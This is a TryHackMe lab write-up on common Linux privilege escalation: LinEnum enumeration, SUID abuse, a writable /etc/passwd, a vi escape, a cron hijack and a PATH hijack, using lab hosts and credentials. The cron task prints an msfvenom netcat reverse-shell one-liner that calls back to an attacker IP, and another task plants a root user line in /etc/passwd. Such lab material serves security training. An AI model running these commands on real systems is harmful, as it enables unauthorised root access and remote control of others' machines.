---
title: Common Linux Privesc
desc: 'THM: A room explaining common Linux privilege escalation'
---
## Introduction
This room covers common Linux privilege escalation vulnerabilities and techniques.

## Task 2 - Understanding Privesc
At its core, privilege escalation involves going from a lower permission to a higher permission. On a technical level, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an OS or application to gain unauthorized access to resources that are usually restricted for the typical users.

## Task 3 - Direction of Privilege Escalation
Privilege escalation can happen in two directions:

- **Horizontal privilege escalation**: Here you pivot to a different user who is on the same privilege level as you. This allows you to inherit whatever files and access that user may have. This can be used, for example, to gain access to another normal privilege user that happens to have SUID file access which can be then be used to achieve higher privilege access.
- **Vertical privilege escalation (privilege elevation)**: Here you attempt to gain higher privilege access with an existing account that you have already compromised. For local privilege escalation attacks, this might mean pivoting to an account with administrator or root privileges.

## Task 4 - Enumeration
Enumeration of a target is essential when exploring privilege escalation vectors. One of the most common ways to enumerate a target host is via the use of a bash script known as [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh).

### LinEnum
LinEnum is a simple bash script that performs common commands related to privilege escalation. Prior to running the script, it is necessary to get LinEnum onto the target machine. This can be accomplished by downloading the script directly onto the target host from the host or from a server controlled by the attacker.

Note that the file needs executable permission prior to execution (`chmod +x FILENAME.sh`).

LinEnum's output is broken down into different sections:

- **Kernel**: Kernal information is shown here. There is most likely a kernel exploit available for this machine.
- **Can we read/write sensitive files**: The world-writable files are shown in this section. These are files that any authenticated user can read and write to (even if normally they shouldn't).
- **SUID Files**: The out of the SUID files is shown here. SUID is a special type of file permission given to a file which allows the file to run with the permissions of whoever the owner is. If the owner is root, it runs with root permissions. This is a common vector for privilege escalation in CTFs.
- **Crontab Contents**: The scheduled cron jobs are shown in this section. Cron is used to schedule commands that execute at the specified time. These scheduled commands or tasks are know as "cron jobs". Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute.

### Questions
SSH into target machine using the provided credentials `user3:password`. This will act as our initial foothold on the system as a normal user privilege.

To begin the enumeration with LinEnum, we first need to download the script onto the target machine using `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`.

Mark the script as an executable.

![LinEnum Permissions](../../assets/images/thm/commonlinuxprivesc/01%20-%20linenum.png)

Run LinEnum with the following options:

```text 
$ ./LinEnum.sh | tee linenum.output
```

In the above command we are executing LinEnum and writing the output to a file called `linenum.output` for analysis later. Note that we could use the `-r` and `-e` commands to accomplish the same thing.

From the output of LinEnum, we can see that the target's hostname is `polobox`.

![LinEnum Hostname](../../assets/images/thm/commonlinuxprivesc/02%20-%20linenum.png)

Under the "Contents of /etc/passwd" section, we find that a total of `8` "user[x]" are on the system.

Under the "Available shells" section, we can that there are a total of `4` shells available on the system.

![LinEnum Shells](../../assets/images/thm/commonlinuxprivesc/03%20-%20linenum.png)

Under the "Crontab contents" we find that the script `autoscript.sh` is set to run every 5 minutes.

![LinEnum Crontab](../../assets/images/thm/commonlinuxprivesc/04%20-%20linenum.png)

Going through LinEnum's output, we find that the permissions on `/etc/passwd` have been modified to give write access to the group owner.

![/etc/passwd Permissions](../../assets/images/thm/commonlinuxprivesc/05%20-%20linenum.png)

## Task 5 - Abusing SUID/GUID Files
For information on Linux file permissions and implications of SUID/GUID bits, see notes on SUID/GUID linked [here](../../notes/privesc_linux/suid.md).

### Questions

User3 has a file with the SUID bit set located at `/home/user3/shell`.

![User3 SUID File](../../assets/images/thm/commonlinuxprivesc/06%20-%20suid.png)

Since user3 has execute permissions on the file and the file is owned by root, executing the file gives us root privileges.

![SUID Root Access](../../assets/images/thm/commonlinuxprivesc/07%20-%20suid.png)

## Task 6 - Exploiting Writeable /etc/passwd
For information on Linux file permissions and implications of improper file permissions on `/etc/passwd` and `/etc/shadow` files, refer to the following notes linked [here](../../notes/privesc_linux/passwdshadow.md).

### Questions

Use OpenSSL to generate hash.

![Hash Generation](../../assets/images/thm/commonlinuxprivesc/08%20-%20passwd.png)

With the above hash, add the following user to the `/etc/passwd` file.

```text
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

![Add User to passwd](../../assets/images/thm/commonlinuxprivesc/09%20-%20passwd.png)

With the user added, all we need to do now is use the `su [username]` command to elevate our privileges.

![Passwd Root Privilege](../../assets/images/thm/commonlinuxprivesc/10%20-%20passwd.png)

## Task 7 - Escaping Vi Editor
Let's begin by checking if we can run any command as a super user without requiring the root password. This can be accomplished by using the command `sudo -l`.

![sudo -l](../../assets/images/thm/commonlinuxprivesc/11%20-%20sudo%20l.png)

Looks like we are able to run the root owned `/usr/bin/vi` without the need for a root password.

Execute the application using the command `sudo vi`. Note that the root password is not requested when running the application.

We can exploit the fact that Vi is now running as root by escaping Vi and spawning a shell using `:!sh`. Since Vi is owned by the root user, the spawned shell will also be for the root user.

![Vi sh](../../assets/images/thm/commonlinuxprivesc/12%20-%20vi%20sh.png)

![Vi Escape Shell](../../assets/images/thm/commonlinuxprivesc/13%20-%20vi%20root.png)

## Task 8 - Exploiting Crontab
For information on privilege escalation using Cron and Cron jobs, refer to notes linked [here](../../notes/privesc_linux/crontab.md).

### Questions

Looking at the contents of `/etc/crontab` we find that a scheduled task owned by the root user executes a script every five minutes.

![Crontab](../../assets/images/thm/commonlinuxprivesc/14%20-%20crontab.png)

Looking at the permissions of the script, we find that the script is owned by user4 who has full privileges for the file. This is important as we can now edit the contents of the script file to permit privilege escalation.

![Crontab Script Permission](../../assets/images/thm/commonlinuxprivesc/15%20-%20crontab.png)

Let's create a payload using *msfvenom* on our local machine which we can use to call back to our machine when the cron job is executed.

```text
$ msfvenom -p cmd/unix/reverse_netcat lhost=10.13.17.49 lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 89 bytes
mkfifo /tmp/puvp; nc 10.13.17.49 8888 0</tmp/puvp | /bin/sh >/tmp/puvp 2>&1; rm /tmp/puvp
```

Note that we will need to copy the output of *msfvenom* to the `autoscript.sh` file on the remote machine. Before we do that, let's start our *netcat* listener on port 8888.

```text
$ nc -lvnp 8888
```

Copy the output of *msfvenom* to the target script file on the remote machine.

```text
$ echo "mkfifo /tmp/puvp; nc 10.13.17.49 8888 0</tmp/puvp | /bin/sh >/tmp/puvp 2>&1; rm /tmp/puvp" > autoscript.sh
```

![Crontab msfvenom](../../assets/images/thm/commonlinuxprivesc/16%20-%20crontab.png)

Now we just need to wait for five minutes to get a call back on our *netcat* listening session.

![Crontab PrivEsc](../../assets/images/thm/commonlinuxprivesc/17%20-%20crontab.png)

## Task 9 - Exploiting PATH Variable
For information on privilege escalation by exploiting PATH variables, refer to the notes linked [here](../../notes/privesc_linux/pathvariable.md).

### Questions

Looking at the contents of the home directory for user5, we find a file named *script* with SUID bit set. Executing the binary, we find that the binary most likely calls the `ls` command to display the contents of the current directory.

![Execute Binary](../../assets/images/thm/commonlinuxprivesc/18%20-%20path.png)

To test whether absolute paths are used in the binary or not, let's create a custom `ls` script in the `/tmp` directory which executes `/bin/bash` when called.

![Script](../../assets/images/thm/commonlinuxprivesc/19%20-%20path.png)

Mark the script as executable.

![Executable](../../assets/images/thm/commonlinuxprivesc/20%20-%20path.png)

Now we need to add `/tmp` directory to our local *PATH* variable. This will redirect the `ls` binary call in the SUID binary to our script file in the `/tmp` folder.

![Modify PATH](../../assets/images/thm/commonlinuxprivesc/21%20-%20path.png)

Now execute the *script* binary to get privilege escalation.

![PATH PrivEsc](../../assets/images/thm/commonlinuxprivesc/22%20-%20privesc.png)

## Additional Resources

- [Payload All the Things - Linux Privilege Escalation](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
  
